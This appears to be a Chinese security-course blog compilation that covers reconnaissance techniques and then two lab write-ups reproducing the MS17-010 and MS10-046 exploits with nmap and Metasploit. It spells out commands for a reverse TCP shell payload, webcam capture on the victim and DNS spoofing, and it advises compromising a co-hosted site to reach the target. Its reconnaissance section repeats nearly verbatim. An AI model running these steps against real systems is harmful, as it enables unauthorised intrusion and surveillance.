信息收集补全版

信息收集分为主动信息收集和被动信息收集。

主动的信息收集方式：通过直接访问、扫描网站，这种将流量流经网站的行为及通过目标识别，端口扫描，指纹识别等方式
被动的信息收集方式：通过收集域名信息，DNS记录分析，收集敏感信息和跟踪路由信息及利用第三方的服务对目标进行访问了解，比如：Google搜索

域名(Whois查询)

whois是用来查询域名注册所有者等信息的传输协议。简单说，whois就是一个用来查询域名是否已经被注册，以及注册域名的详细信息的数据库（如域名所有人、域名注册商）。通过whois来实现对域名信息的查询。早期的whois查询多以命令行接口存在，但是现在出现了一些网页接口简化的线上查询工具，可以一次向不同的数据库查询。网页接口的查询工具仍然依赖whois协议向服务器发送查询请求，命令行接口的工具仍然被系统管理员广泛使用。whois通常使用TCP协议43端口。每个域名/IP的whois信息由对应的管理机构保存

谷歌Hacking语法

intitle:搜索网页标题中包含有特定字符的网页。例如输入“intitle: cbi”，这样网页标题中带有cbi的网页都会被搜索出来。

inurl:搜索包含有特定字符的URL。例如输入“inurl:cbi”，则可以找到带有cbi字符的URL。

intext:搜索网页正文内容中的指定字符，例如输入“intext:cbi”。这个语法类似我们平时在某些网站中使用的“文章内容搜索”功能。

Filetype:搜索指定类型的文件。例如输入“filetype:cbi”，将返回所有以cbi结尾的文件URL。

Site:找到与指定网站有联系的URL。例如输入“Site：family.chinaok.com”。所有和这个网站有联系的URL都会被显示。
link:搜索某个网站的链接
or:同时搜索两个或更多的关键字

相关域名收集

旁站及c段收集

旁站指的是同一服务器上的其他网站，很多时候，有些网站可能不是那么容易入侵。那么，可以查看该网站所在的服务器上是否还有其他网站。如果有其他网站的话，可以先拿下其他网站的webshell，然后再提权拿到服务器的权限，最后就自然可以拿下该网站了！
C段指的是同一内网段内的其他服务器，每个IP有ABCD四个段，举个例子，192.168.0.1，A段就是192，B段是168，C段是0，D段是1，而C段嗅探的意思就是拿下它同一C段中的其中一台服务器，也就是说是D段1-255中的一台服务器，然后利用工具嗅探拿下该服务器

3.“常识”判断法

1.在反查网站ip时，如果此网站有1000多个不同域名，那么这个ip多半不是真实ip。常用的ip反查工具有站长工具、微步在线等等。微步在线支持同服域名查询、子域名查询、服务查询、whois反查等，要注意的是，查询部分信息有次数限制，需先注册账号。
2.如果一个asp或者asp.net网站返回的头字段的server不是IIS、而是Nginx，那么多半是用了nginx反向代理，而不是真实ip。
3.如果ip定位是在常见cdn服务商的服务器上，那么是真实ip的可能性就微乎其微了。

资产

信息收集的资产基本上都是网络资产，也就是信息资产，我认为所有和目标有关的信息都是其信息资产，信息资产的价值应该由其能够带来的影响和后果来评定，比如真实IP，域名，子域名，附带的数据等都是其较为重要的信息资产，下面将要提到的信息收集中需要的信息都是对于目标而言比较重要的信息。

信息收集

信息收集分为主动信息收集和被动信息收集。

主动的信息收集方式：通过直接访问、扫描网站，这种将流量流经网站的行为及通过目标识别，端口扫描，指纹识别等方式
被动的信息收集方式：通过收集域名信息，DNS记录分析，收集敏感信息和跟踪路由信息及利用第三方的服务对目标进行访问了解，比如：Google搜索

域名(Whois查询)

whois是用来查询域名注册所有者等信息的传输协议。简单说，whois就是一个用来查询域名是否已经被注册，以及注册域名的详细信息的数据库（如域名所有人、域名注册商）。通过whois来实现对域名信息的查询。早期的whois查询多以命令行接口存在，但是现在出现了一些网页接口简化的线上查询工具，可以一次向不同的数据库查询。网页接口的查询工具仍然依赖whois协议向服务器发送查询请求，命令行接口的工具仍然被系统管理员广泛使用。whois通常使用TCP协议43端口。每个域名/IP的whois信息由对应的管理机构保存

旁站及c段收集

旁站指的是同一服务器上的其他网站，很多时候，有些网站可能不是那么容易入侵。那么，可以查看该网站所在的服务器上是否还有其他网站。如果有其他网站的话，可以先拿下其他网站的webshell，然后再提权拿到服务器的权限，最后就自然可以拿下该网站了！
C段指的是同一内网段内的其他服务器，每个IP有ABCD四个段，举个例子，192.168.0.1，A段就是192，B段是168，C段是0，D段是1，而C段嗅探的意思就是拿下它同一C段中的其中一台服务器，也就是说是D段1-255中的一台服务器，然后利用工具嗅探拿下该服务器

3.“常识”判断法

1.在反查网站ip时，如果此网站有1000多个不同域名，那么这个ip多半不是真实ip。常用的ip反查工具有站长工具、微步在线等等。微步在线支持同服域名查询、子域名查询、服务查询、whois反查等，要注意的是，查询部分信息有次数限制，需先注册账号。
2.如果一个asp或者asp.net网站返回的头字段的server不是IIS、而是Nginx，那么多半是用了nginx反向代理，而不是真实ip。
3.如果ip定位是在常见cdn服务商的服务器上，那么是真实ip的可能性就微乎其微了。

ms17-010漏洞复现

发表于 2020-01-08 | 分类于 作业

实验名称：ms17-010漏洞利用

实验环境：

攻击机：kali 地址：192.168.163.136

靶机：windows7 地址：192.168.163.135

实验原理：

MS17-010漏洞出现在Windows SMB v1中的内核态函数srv!SrvOs2FeaListToNt在处理FEA(File Extended Attributes)转换时，在大非分页池(Large Non-Paged Kernel Pool)上存在缓冲区溢出。
函数srv!SrvOs2FeaListToNt在将FEA list转换成NTFEA(Windows NT FEA) list前会调用srv!SrvOs2FeaListSizeToNt去计算转换后的FEA lsit的大小，因计算大小错误，而导致缓冲区溢出

实验步骤：

1.用nmap扫描靶机端口开放情况

命令：nmap –T4 –A –v 192.168.163.135

2.把msfconsole开启，搜索ms17-010漏洞

使用攻击模块，查看需要设置的参数

3.根据截图可以看出，只需要设置RHOST即可

设置好RHOST以后执行，执行成功，按下回车出现了win7的cmd，渗透成功

实验扩展

Execute -f notepad.exe //打开记事本

webcam_snap //命令为抓取目标主机当前的摄像头拍摄到的画面，并将它以图片形式保存到本地（本机摄像头无法使用所以没有相应截图）

总结和思考：

通过本次实验，我熟悉了利用NMAP入侵ms17-010漏洞的流程，中间遇到了一些问题，通过反复查看实验教程都得到了解决，实践才是加强记忆的最好方法，也可以迅速加强对知识的掌握程度，希望在不断的实践实验中，我能够取得更多的进步

ms10-046漏洞复现

实验名称：ms10-046漏洞利用

实验环境：

攻击机：kali 地址：192.168.145.129

靶机：windows7 地址：192.168.145.130

实验原理：

Microsoft Windows快捷方式LINK文件自动执行代码漏洞
WinDows支持使用快捷方式或LINK文件。LINK文件是指向本地文件的引用，点击LINK文件于点机快捷方式所制定的目标具有相同效果。WinDows没有正确的处理LINK文件，特制的LINK文件可能导致Windows自动执行快捷方式文件所指定的代码。这些代码可能位于USB驱动，本地或者远程文件系统，光驱或其他位置，使用资源管理器查看了LINK文件所在的位置就足以触发这个漏洞。

实验步骤：

1.msfconsole //启动MSF Metasploit
2.search ms10-046 //搜索漏洞
3.use windows/browser/ms10_046_shortcut_icon_dllloader //加载漏洞模块

4.set payload windows/shell/reverse_tcp //设置一个PAYLOAD为反弹连接shell

5.show options //查看相关设置
6.set SRVHOST 192.168.145.129 //设置攻击者自身IP
7.set LHOST 192.168.145.129 //设置反弹连接回来的IP (攻击者自身IP)
8.exploit //开始执行漏洞

9.配合使用ettercap进行DNS欺骗
10.10.去XP系统机器上测试,用浏览器打开.com网站会跳到共享文件夹下
